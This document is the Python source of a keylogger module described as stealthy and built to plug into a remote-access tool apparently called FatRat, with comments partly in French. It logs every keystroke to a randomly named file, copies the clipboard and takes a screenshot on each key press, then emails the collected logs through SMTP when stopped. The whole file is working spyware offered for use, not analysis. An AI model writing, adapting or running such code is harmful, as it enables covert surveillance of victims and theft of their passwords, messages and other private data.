# from modules.ai_conscience import AIConscience
# ai_conscience = AIConscience()
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Keylogger Module - Stealthy keystroke capture
Compatible with FatRat and other modules
"""
import pynput
from pynput import keyboard
import os

class Keylogger:
    def __init__(self, output_file=None):
        import random, string
        # Obfuscation du nom de fichier
        rand_name = ''.join(random.choices(string.ascii_letters, k=10)) + '.dat'
        self.output_file = output_file or os.path.join(os.path.dirname(__file__), '..', 'results', rand_name)
        self.listener = None
        self.screenshot_dir = os.path.join(os.path.dirname(__file__), '..', 'results', 'screenshots')
        os.makedirs(self.screenshot_dir, exist_ok=True)

    def on_press(self, key):
        try:
            with open(self.output_file, 'a') as f:
                f.write(str(key) + '\n')
        except Exception:
            pass
        # Capture du presse-papier
        try:
            import pyperclip
            clip = pyperclip.paste()
            with open(self.output_file, 'a') as f:
                f.write(f'[CLIPBOARD] {clip}\n')
        except Exception:
            pass
        # Screenshot à chaque touche
        try:
            from PIL import ImageGrab
            import datetime
            img_path = os.path.join(self.screenshot_dir, f'shot_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S%f")}.png')
            ImageGrab.grab().save(img_path)
        except Exception:
            pass

    def start(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        print(f"Keylogger started. Logging to {self.output_file}")

    def stop(self):
        if self.listener:
            self.listener.stop()
        print("Keylogger stopped.")
        self.send_logs()
    def send_logs(self):
        """Envoi automatique des logs par email (exemple SMTP local)"""
        import smtplib
        from email.mime.text import MIMEText
        try:
            with open(self.output_file, 'r') as f:
                data = f.read()
            msg = MIMEText(data)
            msg['Subject'] = 'Keylogger Report'
            msg['From'] = 'rat@localhost'
            msg['To'] = 'admin@localhost'
            s = smtplib.SMTP('localhost')
            s.send_message(msg)
            s.quit()
            print("Logs envoyés par email.")
        except Exception as e:
            print(f"Erreur d'envoi des logs : {e}")

if __name__ == "__main__":
    kl = Keylogger()
    kl.start()
    input("Keylogger running. Press Enter to stop...")
    kl.stop()
